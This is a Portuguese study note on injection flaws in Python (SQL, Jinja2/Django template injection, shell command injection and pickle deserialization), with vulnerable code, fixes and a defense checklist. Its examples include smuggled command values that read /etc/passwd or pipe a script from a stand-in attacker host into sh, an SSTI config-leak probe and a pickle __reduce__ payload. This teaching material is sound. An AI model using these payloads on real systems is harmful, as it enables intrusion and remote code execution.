---
title: "Injeção — SQL, template, comando e deserialização insegura"
created: 2026-07-11
type: concept
status: complete
fase: Adepto
publish: true
tags:
  - python
  - seguranca
  - owasp
  - injecao
  - ssti
aliases:
  - "SSTI"
  - "Server-Side Template Injection"
  - "Command injection (Python)"
  - "Pickle RCE"
  - "Deserialização insegura"
---

# Injeção — SQL, template, comando e deserialização insegura

> [!abstract] TL;DR
> **Injeção** (OWASP A03) é uma família de vulnerabilidades com o mesmo mecanismo raiz: input de usuário sendo interpretado como **código** por um interpretador (SQL, template, shell, serializador), em vez de como **dado**. Esta nota cobre quatro variantes em Python: **SQL injection** (revisitado brevemente — profundidade em [[03-Dominios/Tecnologia/Python/Persistência de dados/01 - SQLAlchemy Core — Engine, Connection e expressão SQL|Galho 9, nota 01]]), **Server-Side Template Injection (SSTI)** em Jinja2/Django Templates — o foco principal, onde uma expressão de template não sanitizada vira execução remota de código via a cadeia `__class__.__mro__.__globals__`, **command injection** via `subprocess.run(shell=True)`/`os.system()`, e **deserialização insegura** via `pickle.loads()` — que não faz *parse* de dados, faz *execução* de código durante a desserialização. A defesa em todos os casos é estrutural, não corretiva: separar dado de código por construção (autoescape, `shell=False` com lista de argumentos, nunca desserializar `pickle` de fonte não confiável), nunca tentar sanitizar depois do fato.

## O relatório que vazou a chave secreta

Uma fintech de médio porte lançou um recurso de "relatório personalizado": o usuário digita um nome (o texto que aparece no cabeçalho do PDF, tipo "Relatório de Fulano — 3º trimestre") e a aplicação Flask renderiza esse texto dentro de um template Jinja2 antes de converter para PDF. O código, resumido, é este:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/relatorio")
def gerar_relatorio():
    nome_usuario = request.args.get("nome", "")
    # Template montado dinamicamente, com o nome do usuário embutido direto na string do template
    template = f"""
    <h1>Relatório personalizado — {nome_usuario}</h1>
    <p>Gerado em {{{{ data_geracao }}}}</p>
    """
    return render_template_string(template, data_geracao="2026-07-11")
```

Passou em code review — "é só um cabeçalho, o usuário digita o próprio nome, não tem SQL envolvido, não tem risco". Um pentest contratado pela fintech testou o campo `nome` com isto:

```
GET /relatorio?nome={{config.items()}}
```

O relatório voltou com o cabeçalho `Relatório personalizado — ItemsView({'ENV': 'production', 'DEBUG': False, 'SECRET_KEY': 'c9f8a3e1...', 'SQLALCHEMY_DATABASE_URI': 'postgresql://app_user:S3nh4Real@prod-db.internal:5432/fintech', ...})`. Em uma linha de query string, o pentest tinha vazado a `SECRET_KEY` da aplicação Flask (usada para assinar cookies de sessão e tokens) e a *connection string* completa do banco de produção, senha incluída. A partir da `SECRET_KEY` vazada, o próximo passo — forjar um cookie de sessão assinado, se autenticando como qualquer usuário sem saber a senha — é trivial. E o pentest nem precisou parar aí: como será visto adiante nesta nota, a mesma classe de vulnerabilidade permite ir de "vazar uma variável de configuração" a "executar comando arbitrário no servidor".

O que aconteceu: `nome_usuario` não virou o *valor* de uma variável de template — virou parte do **texto-fonte do template**, antes de o Jinja2 sequer começar a compilar. `{{config.items()}}` não é uma string qualquer que o Flask exibiu de volta; é uma expressão Jinja2 válida, que o motor de template avaliou como código. Essa é a definição de **Server-Side Template Injection**, e ela é estruturalmente idêntica ao SQL injection que abre a família de vulnerabilidades de injeção do OWASP: input de fora do sistema, tratado como código por um interpretador que confia cegamente no texto que recebe.

## A família de injeção: um mecanismo, quatro interpretadores

Todas as vulnerabilidades desta nota compartilham a mesma estrutura causal, só trocando qual interpretador é enganado:

```mermaid
%%{init: {"theme": "base", "themeVariables": {"primaryColor": "#4A90D9"}}}%%
graph TD
    U["Input do usuário<br/>(query param, form, header, JSON)"] -->|concatenado sem separação| I{"Interpretador"}
    I -->|SQL| S["Banco de dados<br/>executa como consulta"]
    I -->|Template| T["Motor de template<br/>avalia como expressão"]
    I -->|Shell| C["Shell do SO<br/>interpreta como comando"]
    I -->|Serializador| D["pickle.loads<br/>executa bytecode embutido"]
    S -.->|"leitura/escrita<br/>não autorizada"| R1["Vazamento ou<br/>corrupção de dados"]
    T -.->|"acesso a objetos internos<br/>via __class__/__globals__"| R2["RCE — execução<br/>remota de código"]
    C -.->|"; ou &amp;&amp; encadeia<br/>comando extra"| R2
    D -.->|"__reduce__ executa<br/>durante o unpickling"| R2

    style U fill:#F5A623,color:#000
    style R2 fill:#D0021B,color:#fff
    style R1 fill:#D0021B,color:#fff
```

O padrão em comum, em uma frase: **sempre que dado de fora do código-fonte pode alterar a estrutura sintática (não só o valor) do que um interpretador executa, existe uma vulnerabilidade de injeção** — a única pergunta é qual interpretador, e qual o raio de dano quando ele é enganado.

## SQL injection — o princípio, brevemente

A vulnerabilidade mais conhecida da família já foi desenvolvida em profundidade em [[03-Dominios/Tecnologia/Python/Persistência de dados/01 - SQLAlchemy Core — Engine, Connection e expressão SQL|Galho 9, nota 01]], com o exemplo canônico de `f"... WHERE nome = '{nome_busca}'"` versus bind parameters (`text("... WHERE nome = :nome")` combinado com um dicionário de parâmetros, ou a linguagem de expressão do SQLAlchemy, que torna a injeção estruturalmente impossível por construção). Não repito esse desenvolvimento aqui — vale a pena revisitar aquela nota se o mecanismo de bind parameters não estiver fresco.

O que importa reter para o resto desta nota é só o princípio geral que o SQL injection ilustra: a defesa correta nunca é "escapar" ou "validar com regex" o input antes de deixá-lo tocar o interpretador — é usar uma API que **separa estruturalmente** dado de código, de forma que não exista caminho para o input do usuário virar sintaxe. Cada seção a seguir aplica exatamente esse mesmo princípio a um interpretador diferente.

## Server-Side Template Injection (SSTI)

### Como um motor de template processa expressões

Jinja2 (motor de template padrão do Flask, e também usável standalone) e o motor de templates do Django processam um arquivo de template em duas fases: primeiro **compilam** o texto do template — reconhecendo `{{ ... }}` (expressões, cujo resultado é inserido na saída), `{% ... %}` (statements, como `{% for %}`/`{% if %}`) e texto literal — depois **renderizam**, avaliando cada expressão/statement no contexto de variáveis fornecido. A distinção crítica é: essa compilação acontece sobre o **texto-fonte do template**, não sobre os *valores* das variáveis passadas para renderização.

```python
from jinja2 import Template

# Uso correto: nome_usuario é um VALOR de contexto, nunca toca o texto-fonte do template
template_seguro = Template("<h1>Relatório personalizado — {{ nome }}</h1>")
saida = template_seguro.render(nome="{{config.items()}}")
print(saida)
# <h1>Relatório personalizado — {{config.items()}}</h1>
# O texto malicioso aparece como STRING LITERAL na saída — Jinja2 não o interpreta como
# expressão porque ele nunca fez parte do template compilado, só do valor de uma variável.
```

```python
# Uso vulnerável (o padrão do relatório da fintech): nome_usuario vira parte do
# TEXTO-FONTE do template, ANTES da compilação — exatamente o mesmo erro estrutural
# da f-string interpolada em SQL, agora contra o interpretador de templates.
nome_usuario = "{{config.items()}}"
template_vulneravel = Template(f"<h1>Relatório personalizado — {nome_usuario}</h1>")
saida = template_vulneravel.render()
print(saida)
# <h1>Relatório personalizado — ItemsView({'ENV': 'production', ...})</h1>
# Jinja2 avaliou {{config.items()}} como expressão de verdade, porque ela fazia
# parte do template compilado — não do contexto de dados.
```

A diferença entre os dois blocos é a mesma diferença entre `text("WHERE nome = :nome")` e `f"WHERE nome = '{nome}'"` no SQL injection: no primeiro, o valor entra por um canal de **dados**; no segundo, ele entra por um canal de **código-fonte**.

> [!question]- Por que `render_template_string(f"...{nome_usuario}...")` é mais perigoso que simplesmente esquecer o autoescape numa variável?
> Esquecer o autoescape (assunto de XSS, coberto na próxima nota do galho) faz o *valor* de uma variável ser inserido sem escapar HTML — o atacante injeta `<script>`, mas ainda está limitado ao que HTML/JavaScript permitem no navegador da vítima. Montar o *template inteiro* dinamicamente com f-string, como no exemplo do relatório, é categoricamente pior: o atacante injeta sintaxe Jinja2 de verdade, que roda no **servidor**, com acesso ao ambiente Python do processo — variáveis internas, objetos de configuração, e, como a próxima seção mostra, o próprio interpretador Python por trás do motor de template.

### Da leitura de configuração ao RCE: a cadeia `__class__`/`__mro__`/`__globals__`

O exemplo do pentest (`{{config.items()}}`) já é grave — vazamento de segredo. Mas SSTI em Jinja2 normalmente não para em vazamento de dados: como Jinja2 avalia expressões dentro do mesmo interpretador Python que roda a aplicação, e como *quase todo objeto Python* expõe, por herança da linguagem, atributos internos que levam de volta a classes, módulos e, em última instância, funções embutidas como `__import__` ou `os.system`, um atacante com controle sobre uma expressão de template tem, em geral, um caminho até execução de código arbitrário.

O princípio da cadeia de exploração (sem reproduzir aqui um payload de exploit pronto — o objetivo é entender o mecanismo, não fornecer uma ferramenta de ataque):

1. **Qualquer objeto Python tem `__class__`.** Mesmo um objeto aparentemente inofensivo — uma string vazia `''`, um número — expõe sua classe: `''.__class__` é `<class 'str'>`.
2. **Toda classe tem `__mro__`** (*Method Resolution Order* — a cadeia de herança). `''.__class__.__mro__` inclui `object`, a classe-base de tudo em Python.
3. **A partir de `object`, é possível navegar até subclasses arbitrárias já carregadas no processo** — incluindo classes ligadas a I/O, subprocessos, ou ao próprio sistema de import — usando `__subclasses__()` para enumerar as subclasses de `object` já em memória.
4. **Funções (não só classes) têm `__globals__`**, um dicionário com o namespace global do módulo onde foram definidas — que costuma incluir `__builtins__`, o módulo com `eval`, `exec`, `__import__`, e todas as funções embutidas da linguagem.

Encadeando esses quatro passos — todos atributos padrão da linguagem Python, nenhum deles um "bug" do Jinja2 — um atacante com uma expressão de template livre consegue, na prática, chegar a algo equivalente a `os.system("qualquer comando")` rodando no servidor. Esse é o motivo de o OWASP classificar SSTI, quando o motor de template roda sobre uma linguagem de propósito geral como Python (diferente de motores de template "logic-less" como Mustache), como equivalente em severidade a RCE direto — não como "só" um vazamento de informação.

```mermaid
sequenceDiagram
    participant A as Atacante
    participant App as Aplicação Flask
    participant J as Jinja2 (no processo Python)

    A->>App: GET /relatorio?nome={{ config.items() }}
    App->>J: render_template_string(f"...{nome}...")
    Note over J: nome vira parte do TEXTO-FONTE<br/>do template, antes da compilação
    J->>J: compila {{ config.items() }} como expressão
    J->>App: avalia — retorna dict de configuração
    App-->>A: SECRET_KEY, DATABASE_URI vazados

    Note over A,J: Com controle de expressão, o atacante<br/>encadeia __class__.__mro__.__subclasses__()<br/>até uma classe com acesso a subprocess/os
    A->>App: GET /relatorio?nome={{ ...__globals__[os]... }}
    App->>J: avalia expressão maliciosa
    J->>J: resolve __globals__ até os.system
    J->>App: comando do SO executado NO SERVIDOR
    App-->>A: RCE completo
```

### Django Templates: mais restrito, mas não imune

O motor de template nativo do Django é deliberadamente mais restrito que Jinja2 — ele não expõe acesso arbitrário a atributos Python via `.` da mesma forma irrestrita (o acesso a atributo no template Django tenta primeiro indexação de dicionário, depois atributo, depois indexação de lista, e falha silenciosamente em vez de levantar exceção para atributos começando com `_`), o que fecha boa parte da cadeia `__class__`/`__globals__` descrita acima por padrão. Ainda assim, a mesma classe de erro estrutural — montar o **texto-fonte** do template dinamicamente a partir de input do usuário, em vez de passá-lo como valor de contexto — continua sendo SSTI em Django Templates também, e o vetor mais comum na prática é justamente o uso de `Template(string_com_input_do_usuario)` (a API de baixo nível, `django.template.Template`) em vez de sempre passar valores pelo `context`. E quando um projeto Django troca deliberadamente o motor padrão por Jinja2 (`django.template.backends.jinja2.Jinja2`, opção suportada nativamente desde o Django 1.8), toda a exposição de Jinja2 descrita acima volta a valer.

O mesmo erro estrutural, em Django, tem esta forma:

```python
from django.template import Template, Context

# Vulnerável — o texto-fonte do template é montado com f-string a partir de input do usuário
def gerar_boletim_vulneravel(request):
    nome_usuario = request.GET.get("nome", "")
    template = Template(f"<h1>Boletim de {nome_usuario}</h1>")
    return template.render(Context({}))

# Corrigido — template fixo, nome_usuario entra só como valor de contexto
TEMPLATE_BOLETIM = Template("<h1>Boletim de {{ nome }}</h1>")

def gerar_boletim_corrigido(request):
    nome_usuario = request.GET.get("nome", "")
    return TEMPLATE_BOLETIM.render(Context({"nome": nome_usuario}))
```

Na prática, a esmagadora maioria dos projetos Django nunca chama `django.template.Template` diretamente — usa `render(request, "boletim.html", {"nome": nome_usuario})`, carregando o template de um arquivo `.html` versionado no repositório. Esse padrão já é imune a SSTI por construção, porque o texto-fonte do template nunca é composto em tempo de execução a partir de dado externo — o vetor só aparece quando alguém, deliberadamente ou por atalho, monta o template como string dinâmica.

### A defesa: nunca montar o template a partir de input, e autoescape como padrão

A defesa estrutural para SSTI tem duas camadas, e ambas já são o padrão moderno em Flask/Jinja2 e Django quando usados corretamente:

**Camada 1 — nunca deixar input do usuário compor o texto-fonte do template.** O template é sempre uma string fixa, definida no código-fonte ou carregada de um arquivo `.html` versionado — nunca montada com f-string, `.format()` ou concatenação a partir de dado externo. O valor do usuário entra **exclusivamente** como argumento de contexto para `render()`/`render_template()`:

```python
# Corrigido — o template é fixo; nome_usuario entra só como VALOR de contexto
from flask import Flask, request, render_template_string

app = Flask(__name__)

TEMPLATE_RELATORIO = """
<h1>Relatório personalizado — {{ nome }}</h1>
<p>Gerado em {{ data_geracao }}</p>
"""

@app.route("/relatorio")
def gerar_relatorio():
    nome_usuario = request.args.get("nome", "")
    return render_template_string(
        TEMPLATE_RELATORIO,
        nome=nome_usuario,
        data_geracao="2026-07-11",
    )
```

Com essa mudança, `nome=nome_usuario` entra como valor da variável de contexto `nome` — mesmo que `nome_usuario` seja literalmente a string `"{{config.items()}}"`, ela é inserida como **texto**, exibida ao usuário exatamente como digitou, nunca reinterpretada como expressão Jinja2. A regra é idêntica em espírito à de bind parameters no SQL: o dado nunca toca o canal de código.

**Camada 2 — autoescape ligado por padrão.** Tanto Flask (via Jinja2, quando o template tem extensão `.html`/`.htm`/`.xml`/`.xhtml`, ou quando `render_template_string` é chamado dentro do contexto de app do Flask) quanto Django Templates fazem **autoescape de HTML** por padrão — todo valor inserido via `{{ variavel }}` tem caracteres especiais de HTML (`<`, `>`, `&`, `"`, `'`) automaticamente convertidos para suas entidades, o que neutraliza a classe irmã de vulnerabilidade, XSS (desenvolvida na próxima nota do galho, [[03-Dominios/Tecnologia/Python/Segurança/03 - XSS e CSRF nos frameworks Python|03 — XSS e CSRF nos frameworks Python]]). Autoescape não é a mesma defesa que "template fixo" — resolve um problema adjacente, injeção de HTML/JS no navegador da vítima —, mas as duas defesas juntas são o padrão moderno e devem ser tratadas como não-negociáveis, nunca desligadas com `|safe` (Jinja2) ou `mark_safe`/`{% autoescape off %}` (Django) sobre dado vindo de fora do código.

> [!warning] `render_template_string` com f-string embutindo input do usuário
> **O que acontece:** o código monta a *string do template* dinamicamente, concatenando ou interpolando um valor de usuário dentro dela, antes de chamar `render_template_string()`.
> **Por quê:** o valor deixa de ser um argumento de contexto e passa a fazer parte do texto-fonte compilado pelo Jinja2 — qualquer sintaxe de expressão (`{{ }}`) dentro do valor é interpretada como código do template, com acesso ao namespace Python do processo.
> **Como evitar:** o template é sempre uma string ou arquivo fixo, versionado no código-fonte; todo valor externo entra exclusivamente como argumento nomeado de `render()`/`render_template()`/`render_template_string(template_fixo, **contexto)`.

## Command injection

### `shell=True` e `os.system()`: o mesmo erro, contra o shell do SO

`subprocess` é a API moderna e recomendada para rodar processos externos em Python (substituindo `os.system()`/`os.popen()`, que a própria documentação oficial trata como legado). O parâmetro `shell=True` de `subprocess.run()` — e `os.system()`, que sempre passa pelo shell — instrui o Python a entregar o comando para um shell (`/bin/sh` no Linux/macOS, `cmd.exe` no Windows) interpretar, em vez de executar o programa diretamente. Isso reabre exatamente o mesmo problema estrutural do SQL injection e do SSTI, agora contra o interpretador de shell: se um valor de usuário é concatenado dentro do comando, caracteres de controle do shell (`;`, `&&`, `|`, `` ` ``, `$()`) permitem ao atacante encadear um comando adicional, arbitrário.

```python
import subprocess

# Vulnerável: nome_arquivo concatenado dentro de um comando interpretado pelo shell
def verificar_arquivo(nome_arquivo: str) -> str:
    resultado = subprocess.run(
        f"ls -la /uploads/{nome_arquivo}",
        shell=True,
        capture_output=True,
        text=True,
    )
    return resultado.stdout

# Payload do atacante:
verificar_arquivo("teste.txt; cat /etc/passwd")
# O shell recebe: ls -la /uploads/teste.txt; cat /etc/passwd
# O ; encerra o primeiro comando e inicia um segundo, completamente arbitrário —
# rodando com as mesmas permissões do processo Python.
```

O mesmo vale, de forma ainda mais direta, para `os.system()`:

```python
import os

# Vulnerável — os.system() SEMPRE passa pelo shell, não existe variante shell=False
def compactar_diretorio(nome_dir: str):
    os.system(f"tar -czf backup.tar.gz {nome_dir}")

compactar_diretorio("uploads && curl http://atacante.com/malware.sh | sh")
# Dois comandos encadeados por &&, o segundo baixa e executa um script arbitrário.
```

### A defesa: `shell=False` com lista de argumentos

A correção estrutural, análoga a bind parameters no SQL e a "template fixo + contexto separado" em SSTI: nunca deixar o valor do usuário tocar uma string de comando interpretada pelo shell. `subprocess.run()` aceita (e usa por padrão, quando `shell` não é especificado) uma **lista** de argumentos — o programa é executado diretamente pelo sistema operacional (via `exec`), sem shell intermediário nenhum interpretando os argumentos como sintaxe:

```python
import subprocess
import shlex

# Corrigido — shell=False (padrão), argumentos como LISTA, nunca como string concatenada
def verificar_arquivo(nome_arquivo: str) -> str:
    resultado = subprocess.run(
        ["ls", "-la", f"/uploads/{nome_arquivo}"],
        shell=False,  # padrão; explícito aqui por clareza
        capture_output=True,
        text=True,
    )
    return resultado.stdout

# Mesmo payload de antes:
verificar_arquivo("teste.txt; cat /etc/passwd")
# O SO recebe o argumento único "/uploads/teste.txt; cat /etc/passwd" e tenta abrir
# um arquivo com esse nome literal (que não existe) — o ";" nunca é interpretado
# como separador de comando, porque não existe shell no caminho de execução.
```

Com `shell=False` e argumentos em lista, cada elemento da lista é transmitido ao sistema operacional como um argumento **discreto**, exatamente da mesma forma que bind parameters são transmitidos ao banco separadamente do texto SQL — não existe canal para o valor do usuário alterar a estrutura do comando, só o seu conteúdo.

### Cenário de produção: conversão de imagem via ImageMagick

Um padrão comum — e uma fonte real de incidentes de command injection — é um serviço de upload que converte a imagem enviada pelo usuário para um formato padronizado, invocando uma ferramenta de linha de comando (ImageMagick, `ffmpeg`, `pandoc`) em vez de uma biblioteca Python nativa:

```python
import subprocess

# Vulnerável: nome_arquivo_original vem do campo "filename" do multipart/form-data,
# controlado inteiramente pelo cliente que fez o upload
def converter_para_png(nome_arquivo_original: str, caminho_destino: str):
    subprocess.run(
        f"convert /tmp/uploads/{nome_arquivo_original} {caminho_destino}",
        shell=True,
    )

# Um arquivo enviado com o nome:
#   "foto.jpg; curl http://atacante.com/shell.sh | sh #.jpg"
# resulta no shell recebendo dois comandos separados por ";" — o segundo baixa e
# executa um script arbitrário. O "#" no final comenta o restante da linha, então
# o comando "convert" original nem precisa ser sintaticamente válido para o ataque funcionar.
```

A correção segue o mesmo padrão de `shell=False` com lista, mas aqui vale reforçar um detalhe adicional: mesmo com `shell=False`, o **nome do arquivo de destino** ainda deve ser gerado pela aplicação (um UUID, por exemplo), nunca derivado diretamente do nome enviado pelo cliente — não por causa de command injection (que `shell=False` já neutraliza), mas porque um nome de arquivo controlado pelo atacante ainda abre a porta para um vetor diferente, *path traversal* (`../../etc/cron.d/malicioso`), fora do escopo desta nota mas coberto na próxima, sobre validação de input.

```python
import subprocess
import uuid
import os

def converter_para_png(nome_arquivo_original: str, diretorio_uploads: str, diretorio_saida: str) -> str:
    # Nome de destino gerado pela aplicação, nunca derivado do input do cliente
    nome_saida = f"{uuid.uuid4()}.png"
    caminho_origem = os.path.join(diretorio_uploads, nome_arquivo_original)
    caminho_destino = os.path.join(diretorio_saida, nome_saida)

    subprocess.run(
        ["convert", caminho_origem, caminho_destino],
        shell=False,
        check=True,
    )
    return nome_saida
```

> [!question]- E quando o programa realmente precisa de recursos do shell — pipes, wildcards, variáveis de ambiente?
> Quando o uso do shell é genuinamente necessário (por exemplo, um pipeline `comando1 | comando2` que seria verboso reimplementar com `subprocess.Popen` encadeado), a defesa não é abrir mão de `shell=False` — é nunca deixar dado de usuário compor a string do comando sem sanitização estrutural. `shlex.quote()` (stdlib) faz o *escaping* correto de um valor para uso seguro dentro de uma string de shell, mas essa é uma defesa de segunda linha, mais frágil que evitar o shell por completo — a recomendação por padrão continua sendo `shell=False` com lista de argumentos sempre que o programa-alvo aceitar isso, e usar `shlex.quote()` apenas no caso remanescente em que `shell=True` for estritamente inevitável.

> [!warning] `os.system()` ou `subprocess.run(..., shell=True)` com f-string de input do usuário
> **O que acontece:** um comando de shell é montado concatenando um valor vindo de fora (nome de arquivo, parâmetro de URL, campo de formulário) direto na string do comando.
> **Por quê:** o shell interpreta caracteres de controle (`;`, `&&`, `|`, `` ` ``, `$()`) dentro do valor concatenado como sintaxe de encadeamento de comando, não como conteúdo literal — o processo Python delega a interpretação para um interpretador externo que não distingue "parte do comando original" de "input colado".
> **Como evitar:** `subprocess.run(lista_de_argumentos, shell=False)` sempre que possível; se `shell=True` for inevitável, `shlex.quote()` em cada valor externo antes de concatenar — nunca concatenar sem tratamento algum.

## Deserialização insegura: `pickle.loads()` não faz parse, executa código

### O erro conceitual: tratar `pickle` como um formato de dados

`pickle` é o mecanismo nativo do Python para serializar objetos — transformar um objeto Python em memória (uma lista, um dicionário, uma instância de classe arbitrária) numa sequência de bytes, e reconstruí-lo depois. A armadilha conceitual é tratar `pickle.loads()` como se fosse equivalente a `json.loads()`: "é só um parser de um formato binário, desserializa os dados de volta". Não é. A própria [documentação oficial do módulo `pickle`](https://docs.python.org/3/library/pickle.html) traz um aviso explícito logo no topo da página:

> *"Warning: The pickle module is not secure. Only unpickle data you trust. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling."*

O motivo é o protocolo em si: um stream `pickle` não descreve só *dados* — descreve uma sequência de **instruções** para uma máquina de pilha (o *pickle virtual machine*), incluindo, entre elas, a capacidade de invocar `__reduce__()` (ou o protocolo `__reduce_ex__`) de uma classe durante a reconstrução do objeto, o que permite que o processo de desserialização **chame uma função Python arbitrária**, com argumentos controlados pelo atacante, como parte de simplesmente reconstruir o objeto — não como um efeito colateral acidental do parser, mas como um recurso deliberado do protocolo `pickle`, usado legitimamente por objetos complexos que precisam de lógica customizada para se reconstruir corretamente.

```python
import pickle
import os

class Payload:
    def __reduce__(self):
        # __reduce__ retorna (função, argumentos) — pickle.loads() CHAMA essa
        # função com esses argumentos como parte de reconstruir o objeto.
        # Aqui, a "reconstrução" é executar um comando arbitrário no SO.
        return (os.system, ("echo comprometido > /tmp/prova_de_conceito.txt",))

# Serializando o payload malicioso (o atacante faz isso uma vez, offline)
dados_maliciosos = pickle.dumps(Payload())

# ... esses bytes chegam pela rede, de um upload, de um cache compartilhado, de uma
# fila de mensagens, de um cookie — qualquer canal onde o atacante controle o conteúdo

pickle.loads(dados_maliciosos)
# NÃO é "carregar um objeto Payload". É executar os.system(...) imediatamente,
# ANTES de qualquer objeto Payload sequer existir. A desserialização É a execução.
```

Este é o motivo de tratar `pickle.loads()` de dado não confiável como categoricamente equivalente a `eval()` de uma string de origem externa — ambos avaliam/executam, não fazem *parse*, apesar de "parece que só estão lendo dados".

> [!warning] `pickle.loads()` de qualquer fonte que não seja 100% controlada pela própria aplicação
> **NUNCA desserialize `pickle` de fonte não confiável.** Isso inclui, sem exceção: dados vindos de rede (um payload HTTP, um header, um corpo de request), de um formulário ou upload de usuário, de um cache compartilhado (Redis/Memcached) que outro serviço ou tenant também escreve, de uma fila de mensagens (Celery com backend `pickle`, RabbitMQ, Kafka) que não seja estritamente interna e imutável, ou de um cookie de sessão feito à mão. A pergunta certa nunca é "esse pickle parece bem formado?" — é "eu confio, com 100% de certeza, em quem escreveu estes bytes?". Se a resposta não for um "sim" absoluto, `pickle.loads()` sobre esse dado é RCE trivial, um `os.system()` disfarçado de desserialização.

### A defesa: formatos que não executam código

A correção não é "sanitizar" o pickle antes de desserializar — não existe forma confiável de inspecionar um stream `pickle` e garantir que ele não contém um `__reduce__` malicioso sem, na prática, reimplementar boa parte da própria máquina de pilha do protocolo. A defesa estrutural é trocar de formato: usar um serializador cujo protocolo, por design, **não tem** capacidade de invocar código arbitrário durante o parsing.

```python
import json

# json.loads() faz PARSE puro — o resultado é sempre dict/list/str/int/float/bool/None,
# nunca uma chamada de função arbitrária. Não existe __reduce__ equivalente em JSON.
dados = json.loads(bytes_recebidos_da_rede)
```

Para objetos de domínio mais ricos que dict/list simples — onde `json` puro não basta, porque a aplicação quer validação de schema e tipos fortes, não só um dicionário genérico —, `Pydantic` (já coberto em [[03-Dominios/Tecnologia/Python/Web e APIs REST/03 - Pydantic — validação, serialização e o contrato de dados da API|Galho 10, nota 03]]) e `marshmallow` desserializam JSON para objetos tipados **sem** nunca invocar código arbitrário do atacante — o schema define exatamente quais campos e tipos são aceitos, e qualquer coisa fora disso é rejeitada como erro de validação, não executada.

| Formato | Desserializa para | Executa código do atacante? |
|---------|-------------------|------------------------------|
| `pickle` | Qualquer objeto Python, incluindo chamadas via `__reduce__` | Sim, por design do protocolo |
| `json` | Só `dict`/`list`/`str`/`int`/`float`/`bool`/`None` | Não — parser puro, sem hooks de execução |
| `Pydantic` / `marshmallow` (sobre JSON) | Objetos tipados, validados contra schema | Não — rejeita o que não casa com o schema declarado |
| `yaml.safe_load()` | `dict`/`list`/tipos primitivos | Não (diferente de `yaml.load()` sem `Loader=SafeLoader`, que tem o mesmo problema estrutural do `pickle`) |

> [!question]- E quando `pickle` é usado só internamente — por exemplo, cache de objetos Python entre processos do mesmo serviço, nunca exposto de fora?
> Mesmo nesse caso, "confiança" precisa ser avaliada pelo **caminho de dados completo**, não pela intenção original do design. Um cache Redis compartilhado entre múltiplos serviços, um multi-tenant onde outro tenant pode escrever no mesmo namespace de cache, ou uma fila de mensagens que algum dia ganhou um produtor externo — todos esses são exemplos reais de "uso interno" que deixou de ser confiável sem que o código que faz `pickle.loads()` tenha mudado. Célery, por padrão histórico, usa `pickle` como serializer de tarefas — e a própria documentação do Celery recomenda migrar para `json` como serializer padrão exatamente por esse motivo; se `pickle` for mantido no Celery, o broker (Redis/RabbitMQ) precisa estar tão protegido quanto o próprio código da aplicação, porque qualquer um capaz de publicar uma mensagem na fila ganha RCE no worker.

## Checklist de defesa

- [ ] **SQL:** todo valor externo passa por bind parameters (`text()` com `:nome` + dict, ou a linguagem de expressão do SQLAlchemy/ORM) — nunca concatenação/f-string. Ver [[03-Dominios/Tecnologia/Python/Persistência de dados/01 - SQLAlchemy Core — Engine, Connection e expressão SQL|Galho 9, nota 01]].
- [ ] **Template:** o texto-fonte do template é sempre fixo (string literal ou arquivo versionado) — input do usuário entra exclusivamente como valor de contexto (`render(nome=valor)`), nunca concatenado na string do template.
- [ ] **Autoescape** ligado (padrão em Flask/Jinja2 e Django Templates) — `|safe`/`mark_safe`/`{% autoescape off %}` só sobre conteúdo gerado pela própria aplicação, nunca sobre input externo.
- [ ] **Comando de shell:** `subprocess.run(lista_de_argumentos, shell=False)` — nunca `os.system()` ou `subprocess.run(string, shell=True)` com valor externo concatenado. Se `shell=True` for estritamente inevitável, `shlex.quote()` em cada valor externo.
- [ ] **Desserialização:** `pickle.loads()` NUNCA sobre dado que não seja 100% controlado pela própria aplicação — usar `json`/`Pydantic`/`marshmallow`/`yaml.safe_load()` para qualquer dado vindo de rede, upload, cache compartilhado ou fila de mensagens.
- [ ] Revisão de código trata qualquer f-string/`.format()`/concatenação que misture input externo com SQL, template, comando de shell ou stream binário como sinal de alerta automático, independente de quão "interno" ou "confiável" o caminho pareça no momento.

## Como explicar em inglês

In an interview, the cleanest way to frame this family of vulnerabilities is by naming the shared mechanism first, then the specific interpreter:

> "Injection vulnerabilities all share the same root cause: user input crossing from a data channel into a code channel, so an interpreter — SQL, a template engine, a shell, a deserializer — ends up executing attacker-controlled syntax instead of just reading a value. The fix is never sanitization after the fact; it's picking an API that keeps data and code structurally separate from the start. Bind parameters do it for SQL. Passing values as template context — never building the template string itself from user input — do it for Jinja2 or Django templates. `subprocess.run()` with a list of arguments and `shell=False` does it for shell commands. And for deserialization, the fix is choosing a format like JSON that has no code-execution hooks in its parser at all — `pickle` isn't a data format with a security bug, it's a format whose specification includes calling arbitrary functions during load, so treating untrusted `pickle` input as safe is a category error, not a missed edge case."

| PT | EN |
|----|----|
| injeção | injection |
| desserialização insegura | insecure deserialization |
| execução remota de código (RCE) | remote code execution (RCE) |
| autoescape | autoescaping |
| separação de dado e código | separation of data and code |
| superfície de ataque | attack surface |

## O que vem a seguir

Injeção resolve o problema de "input do usuário virando código no servidor". A próxima categoria da família OWASP A03 é o espelho no lado do cliente: XSS injeta código que roda no **navegador da vítima**, não no servidor, e CSRF explora a confiança automática que o navegador deposita em cookies de sessão. As duas dependem de mecanismos de defesa relacionados (autoescape, já visto aqui, é a primeira linha contra XSS) mas com modelo de ameaça diferente.

- [[03-Dominios/Tecnologia/Python/Segurança/03 - XSS e CSRF nos frameworks Python|03 — XSS e CSRF nos frameworks Python]] — desenvolve autoescape como defesa contra XSS em profundidade, e por que APIs stateless com JWT em header são naturalmente imunes a CSRF.
- [[03-Dominios/Tecnologia/Python/Segurança/04 - Validação de input como controle de segurança|04 — Validação de input como controle de segurança]] — revisita Pydantic sob a lente de segurança: o que validação de tipo previne e o que ela não previne (inclusive quanto a SSTI e command injection, cujo input muitas vezes passa por um `str` "validamente formado").
- [[03-Dominios/Tecnologia/Python/Persistência de dados/01 - SQLAlchemy Core — Engine, Connection e expressão SQL|Galho 9, nota 01]] — o desenvolvimento completo de SQL injection e bind parameters, referenciado brevemente nesta nota.

## Fontes

- **OWASP** — [*Injection*](https://owasp.org/Top10/A03_2021-Injection/) — categoria A03 do OWASP Top 10 (2021, versão vigente), definição e mitigações gerais da família de injeção. Consultado em 2026-07.
- **OWASP Cheat Sheet Series** — [*Server Side Template Injection Prevention Cheat Sheet*](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html) — mecanismo de SSTI por motor de template, incluindo a cadeia de exploração via atributos internos de Python em motores "logic-full". Consultado em 2026-07.
